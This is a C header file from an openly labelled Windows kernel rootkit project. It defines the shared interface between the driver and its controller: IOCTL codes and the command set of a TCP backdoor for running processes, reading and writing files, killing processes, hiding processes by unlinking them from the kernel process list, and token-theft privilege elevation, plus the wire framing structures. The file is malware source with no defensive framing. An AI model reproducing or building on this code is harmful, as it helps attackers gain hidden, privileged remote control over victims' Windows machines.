/*==============================================================================
 * rootkit/inc/common.h
 *------------------------------------------------------------------------------
 * Shared definitions between kernel driver and usermode controller.
 * Must remain C11-clean and independent of ntddk.h so the usermode
 * controller can include it directly.
 *============================================================================*/
#pragma once

/*------------------------------------------------------------------------------
 * Platform-specific includes and type aliases
 *---------------------------------------------------------------------------*/
#ifdef _KERNEL_MODE
    #include <ntddk.h>
#else
    #include <windows.h>
    #include <stdint.h>
    typedef uint8_t  u8;
    typedef uint16_t u16;
    typedef uint32_t u32;
    typedef uint64_t u64;
#endif

/*==============================================================================
 * IOCTL CONTROL PLANE
 *------------------------------------------------------------------------------
 * Device type: 0x8A53 (arbitrary, must match in driver and controller).
 * Method: METHOD_BUFFERED for simplicity and security.
 * Access: FILE_ANY_ACCESS (no special permissions required).
 *============================================================================*/
#define ROOTKIT_DEVICE_TYPE 0x8A53

#define IOCTL_ROOTKIT_PING      CTL_CODE(ROOTKIT_DEVICE_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_EXEC      CTL_CODE(ROOTKIT_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_PS        CTL_CODE(ROOTKIT_DEVICE_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_HIDE      CTL_CODE(ROOTKIT_DEVICE_TYPE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_UNHIDE    CTL_CODE(ROOTKIT_DEVICE_TYPE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_ELEVATE   CTL_CODE(ROOTKIT_DEVICE_TYPE, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_UNLOAD    CTL_CODE(ROOTKIT_DEVICE_TYPE, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

/*==============================================================================
 * TCP COMMAND CODES (Wire Protocol)
 *------------------------------------------------------------------------------
 * Sent over the WSK TCP backdoor connection.
 *============================================================================*/
#define CMD_PING        0x01    /* Ping/pong keepalive                    */
#define CMD_EXEC        0x02    /* Execute process (UTF-16LE path)        */
#define CMD_PS          0x03    /* List processes                         */
#define CMD_READ        0x04    /* Read file (UTF-16LE path)              */
#define CMD_WRITE       0x05    /* Write file (offset + path + data)      */
#define CMD_KILL        0x06    /* Terminate process by PID               */
#define CMD_HIDE        0x07    /* Hide process from ActiveProcessLinks   */
#define CMD_UNHIDE      0x08    /* Unhide previously hidden process       */
#define CMD_ELEVATE     0x09    /* Token theft: elevate to target PID     */
#define CMD_UNLOAD      0x0A    /* Request driver unload                  */

/*==============================================================================
 * WIRE FRAMING
 *------------------------------------------------------------------------------
 * Request:  [u32 length LE][u8 cmd][payload ...]
 * Response: [u32 length LE][payload ...]
 * length counts the bytes AFTER the length field (i.e., cmd + payload).
 *============================================================================*/

#pragma pack(push, 1)

/* Generic header: length of payload following this field. */
typedef struct _RK_HDR {
    u32 length;
} RK_HDR;

/* Incoming request frame. */
typedef struct _RK_REQ {
    RK_HDR hdr;      /* length = 1 (cmd) + payload_len */
    u8     cmd;      /* Command code (CMD_*) */
    u8     payload[1]; /* Variable-length payload */
} RK_REQ;

/* Outgoing response frame. */
typedef struct _RK_RESP {
    RK_HDR hdr;      /* length = payload_len */
    u8     payload[1]; /* Variable-length payload */
} RK_RESP;

/* Fixed-size process record returned by CMD_PS.
 * Packed to 24 bytes for wire compatibility. */
typedef struct _RK_PROC_ENTRY {
    u32 pid;           /* Process ID */
    u32 ppid;          /* Parent Process ID (currently 0, not resolved) */
    u8  image[16];     /* Image name (null-terminated, max 15 chars) */
} RK_PROC_ENTRY;

#pragma pack(pop)

/* Size of a single process entry on the wire. */
#define RK_PROC_ENTRY_SIZE ((u32)sizeof(RK_PROC_ENTRY))